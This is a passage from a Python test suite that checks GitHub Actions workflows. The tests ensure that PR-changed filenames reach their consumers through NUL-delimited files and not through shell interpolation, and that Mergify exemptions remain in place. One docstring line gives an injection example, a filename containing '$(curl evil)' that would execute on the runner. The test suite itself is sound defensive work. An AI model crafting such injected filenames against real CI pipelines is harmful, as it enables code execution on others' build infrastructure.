    ``${{ steps.changed.outputs.files }}`` interpolated into a ``run:`` AND into
    lychee's ``args:``, and it stayed unreachable only because the PR checkout
    was SHALLOW: with no ``github.event.pull_request.base.sha`` in the object
    store the ``git diff`` failed, ``|| true`` swallowed it, the list came out
    empty, and both consuming steps were skipped. That is an accident of the
    checkout depth, not a control (#4449). Deepen the checkout and a list of
    PR-AUTHOR-CONTROLLED filenames reaches a shell, where a path like
    ``x $(curl evil)/a.md`` executes on the runner — including on a fork PR.

    Both arms are pinned: the list is produced NUL-delimited into a FILE, and
    each consumer reads that file (``xargs -0`` / ``--files-from``) instead of
    receiving interpolated text.
    """
    steps = _load_workflow("ci.yml")["jobs"]["docs"]["steps"]

    changed = next(s for s in steps if s.get("id") == "changed")
    run = changed["run"]

    def _logical(startswith: str) -> str:
        """The shell logical line beginning with ``startswith``, comments stripped.

        Assertions must target a SPECIFIC command: matching the whole ``run``
        block lets an UNRELATED occurrence satisfy them, which is not a pin.
        Measured on an earlier revision of this test — a bare ``"-z" in run``
        was satisfied by the ``sed -z`` two lines later, and a bare
        ``"|| true" in run`` by the ``grep -c . ... || true`` in the count
        line, so deleting ``-z`` or the tolerance from the ``git diff`` left
        the whole suite green. Command continuations (``\``) are joined.
        """
        code = [ln for ln in run.splitlines() if not ln.lstrip().startswith("#")]
        for i, ln in enumerate(code):
            if ln.strip().startswith(startswith):
                parts, j = [], i
                while j < len(code):
                    parts.append(code[j].strip())
                    if not code[j].rstrip().endswith("\\"):
                        break
                    j += 1
                return " ".join(parts)
        raise AssertionError(f"no shell command beginning {startswith!r} in run block")

    diff_cmd = _logical("git diff")
    # NUL-delimited output on the DIFF ITSELF (not the `sed -z` below it).
    assert "-z" in diff_cmd, diff_cmd
    assert "--name-only" in diff_cmd, diff_cmd
    # Only paths that exist on disk: lychee hard-errors on a nonexistent input,
    # and under `--no-renames` a rename contributes its deleted source path.
    assert "--diff-filter ACMR" in diff_cmd, diff_cmd
    # The tolerance, asserted ON THIS COMMAND. `docs` is a REQUIRED status
    # check and a shallow PR checkout has no base sha, so without it git exits
    # 128, the step aborts under `bash -e`, and every PR reds.
    assert "|| :" in diff_cmd or diff_cmd.rstrip().endswith("|| true"), diff_cmd
    assert "$RUNNER_TEMP/pr-md.raw.nul" in diff_cmd, diff_cmd

    # The list is never published as step-output TEXT (a later `${{ ... }}`
    # would re-parse the filenames as shell).
    assert 'echo "files=' not in run, (
        "the PR path must not publish the filenames as step OUTPUT text: a "
        "later `${{ steps.changed.outputs.files }}` re-parses them as shell"
    )
    count_cmd = _logical("count=")
    assert "pr-md.txt" in count_cmd, count_cmd

    lint = next(
        s for s in steps if str(s.get("name", "")) == "Markdownlint (changed files)"
    )
    assert "xargs -0" in lint["run"], (
        "markdownlint must consume the NUL list as ARGV, not as expanded text"
    )
    assert "steps.changed.outputs.files" not in lint["run"]
    assert "${{ steps.changed" not in lint["run"]

    link = next(
        s for s in steps if str(s.get("name", "")) == "Link check (changed files)"
    )
    assert "--files-from" in link["with"]["args"], (
        "lychee must read the list from a FILE"
    )
    assert "steps.changed.outputs.files" not in link["with"]["args"]
    assert "${{ steps.changed" not in link["with"]["args"]
    # A link-free markdown file is legitimate.
    assert link["with"].get("failIfEmpty") is False

    # Both consumers must ALSO be guarded on the PR path: the main-health path
    # sets no `changed` output, so an unguarded `count != '0'` would be TRUE on
    # an empty count and run the step on the nightly with no list.
    for step in (lint, link):
        cond = str(step.get("if", ""))
        assert "!inputs.main_health" in cond, (
            f"{step.get('name')!r} must stay on the PR path only"
        )
        assert "count" in cond, (
            f"{step.get('name')!r} must gate on the produced list, not on `files`"
        )


def test_main_health_nightly_calls_ci_yml_and_never_gates_main():
    wf = _load_workflow("main-health-nightly.yml")
    on = _on_block(wf)
    assert set(on) == {"schedule", "workflow_dispatch"}, (
        "D13 chose nightly/on-demand — a push/PR trigger would pay the CI time "
        f"the plan exists to cut; got {sorted(on)}"
    )
    job = wf["jobs"]["main-health"]
    assert job["uses"] == "./.github/workflows/ci.yml"
    assert job["with"]["main_health"] is True
    assert job.get("secrets") == "inherit"


def test_inbound_relay_keeps_both_mergify_exemption_belts():
    text = (WORKFLOWS_DIR / "inbound-relay.yml").read_text()
    # Two INDEPENDENT belts (#3558): either alone exempts Mergify's batch PR;
    # only removing BOTH re-breaks the relay and dequeues every queued PR.
    assert "github.actor != 'mergify[bot]'" in text
    assert (
        "startsWith(github.event.pull_request.head.ref, 'mergify/merge-queue/')"
        in text
    )
